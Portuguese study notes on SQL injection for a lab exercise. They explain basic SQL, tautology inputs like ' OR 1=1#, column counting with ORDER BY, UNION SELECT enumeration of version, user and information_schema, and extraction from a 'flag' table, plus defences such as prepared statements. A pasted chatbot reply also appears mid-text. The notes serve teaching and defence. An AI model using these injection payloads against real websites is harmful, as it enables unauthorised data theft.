## Introdução à Conexão Back-End e Banco de Dados

[[6 - LABS - SQL injection manual]]

Antes de entendermos como ocorre a **vulnerabilidade de SQL Injection**, precisamos compreender como o **back-end** se comunica com o **banco de dados**.

No desenvolvimento web, o back-end usa linguagens como PHP, Python, JavaScript (Node.js), entre outras, para se conectar a um banco de dados (como MySQL, PostgreSQL, etc.). Através dessa conexão, ele envia **comandos SQL** para **consultar, inserir, atualizar ou excluir dados**.

---

## SQL: A Linguagem de Consulta

SQL (Structured Query Language) é a linguagem utilizada para **interagir com bancos de dados relacionais**. Ela segue uma estrutura padrão com comandos que permitem manipular os dados.

### Principais Comandos SQL:

|Comando|O que faz|Exemplo|
|---|---|---|
|`SELECT`|Seleciona dados da tabela|`SELECT nome, idade FROM users;`|
|`INSERT`|Insere novos dados na tabela|`INSERT INTO users (nome, idade, sexo) VALUES ('Carlos', 23, 'M');`|
|`UPDATE`|Atualiza dados existentes|`UPDATE users SET idade = 24 WHERE nome = 'Carlos';`|
|`DELETE`|Remove dados da tabela|`DELETE FROM users WHERE nome = 'Carlos';`|

### Outros comandos úteis:

- `SHOW DATABASES;` → Lista todos os bancos de dados disponíveis (MySQL).
    
- `USE nome_do_banco;` → Seleciona qual banco de dados usar.
    

---

## O que é SQL Injection?

**SQL Injection** é uma técnica de ataque que **explora falhas na validação de entrada do usuário** em sistemas que usam SQL.

Quando o sistema não trata corretamente os dados fornecidos pelo usuário, é possível **inserir comandos SQL maliciosos** diretamente nas consultas, podendo visualizar, alterar ou até excluir dados do banco.

---

## Exemplo Prático de SQL Injection

Imagine que você tem o seguinte código no back-end:

```sql
SELECT id, nome, descricao FROM products WHERE nome LIKE '%[entrada_usuario]%' OR descricao LIKE '%[entrada_usuario]%';
```

O usuário acessa o site e digita:

```
' OR '1'='1
```

A consulta gerada será:

```sql
SELECT id, nome, descricao FROM products WHERE nome LIKE '%' OR '1'='1%' OR descricao LIKE '%' OR '1'='1%';
```

Resultado: `'1'='1'` sempre será verdadeiro, então o banco retorna **todos os produtos**, burlando qualquer filtro.

---

## Por que é perigoso?

Se não houver proteção, o atacante pode:

- Exfiltrar informações confidenciais;
    
- Alterar ou deletar dados;
    
- Derrubar o sistema;
    
- Escalar o ataque para obter acesso total ao banco.
    

---

## Como evitar SQL Injection?

- **Sempre utilizar consultas parametrizadas** ou **prepared statements**;
    
- **Nunca concatenar entradas do usuário diretamente nas queries**;
    
- **Validar e sanitizar** todas as entradas;
    
- Usar **ORMs seguros** (como Sequelize, Prisma, SQLAlchemy);
    
- **Limitar privilégios** do usuário do banco de dados.
    

---

Perfeito, Rafael! Aqui está o seu conteúdo **com a formatação organizada**, mantendo **todos os comandos intactos**, e com **comentários estruturados** para facilitar o entendimento didático:

---

## Como o SQL Injection funciona na prática

### Exemplo de entrada maliciosa:

Um usuário, em vez de digitar apenas `notebook` na caixa de busca, digitou:

```
notebock' or 1=1# 
```

Essa entrada será enviada ao banco de dados pelo back-end assim:

```sql
SELECT id, nome, descricao 
FROM products 
WHERE nome LIKE "%notebock%" OR 1=1#%" 
   OR descricao LIKE "%notebock%";
```

> A cerquilha `#` **comenta o resto da linha** no MySQL, ou seja, **tudo que vier depois dela será ignorado** pelo banco.

### O que isso causa?

A condição `1=1` é **sempre verdadeira**, então a consulta retorna **todos os produtos**, mesmo que "notebock" não exista.  
Ou seja, o atacante burla o filtro da aplicação e consegue **acesso total aos dados da tabela**.

---

## Fase 1: Descobrir a quantidade de colunas

A primeira etapa de um ataque de SQL Injection é identificar **quantas colunas** estão sendo selecionadas pelo back-end. Isso é necessário para usar a técnica `UNION SELECT`.

### Exemplo:

```sql
SELECT name, description FROM products ORDER BY 1;
SELECT name, description FROM products ORDER BY 2;
```

O atacante vai testando:

```sql
' ORDER BY 1; --
' ORDER BY 2; --
' ORDER BY 3; -- (se der erro, só existem 2 colunas)
```

---

## Fase 2: Usando UNION SELECT

Depois de saber o número de colunas, o atacante pode usar `UNION SELECT` para **inserir dados falsos** ou **extrair informações sensíveis** do banco.

```sql
SELECT name, description 
FROM products 
WHERE name LIKE '%teste%' 
UNION SELECT 1, 2;
```

Isso vai "juntar" um novo resultado à consulta original, com valores `1` e `2` nas colunas correspondentes.

### Exemplo de ataque direto:

```sql
' UNION SELECT 1,2,3,4;# 
```

Com isso, ele força o banco a retornar um **novo "produto falso"** com os valores `1`, `2`, `3`, `4`.

### Agora vamos explorar a vulnerabilidade...

Sabendo que a **coluna 2** exibe o nome do produto (ou outro campo visível), o atacante pode extrair informações do sistema:

```sql
' UNION SELECT 1, @@version, 3, 4;#     -- versão do banco
' UNION SELECT 1, database(), 3, 4;#    -- nome do banco atual
' UNION SELECT 1, user(), 3, 4;#        -- usuário do banco
```

Essas informações são **sensíveis** e ajudam o atacante a mapear o ambiente.

---

## Fase 3: Explorando a estrutura do banco

### Descobrindo tabelas dentro do banco:

```sql
' UNION SELECT 1, table_name, 3, 4 
FROM information_schema.tables 
WHERE table_schema = 'cs';#
```

Suponha que ele descobre duas tabelas:

- `products`
    
- `flag`
    

### Descobrindo colunas da tabela `products`:

```sql
' UNION SELECT 1, column_name, 3, 4 
FROM information_schema.columns 
WHERE table_name = 'products';#
```

Retorno:

```
products → ID, NAME, DESCRIPTION, PRICE
```

### Descobrindo colunas da tabela `flag`:

```sql
' UNION SELECT 1, column_name, 3, 4 
FROM information_schema.columns 
WHERE table_name = 'flag';#
```

Retorno:

```
flag → ID, NAME
```

---

## Fase 4: Extraindo dados sigilosos

Agora que sabemos os nomes das tabelas e colunas, podemos montar um `UNION SELECT` para **extrair os dados diretamente**:

```sql
' OR 1=1 UNION SELECT 1, id, name, 4 FROM flag;#
```

> Isso traria os dados da tabela `flag` diretamente para o campo que exibe os produtos no site.


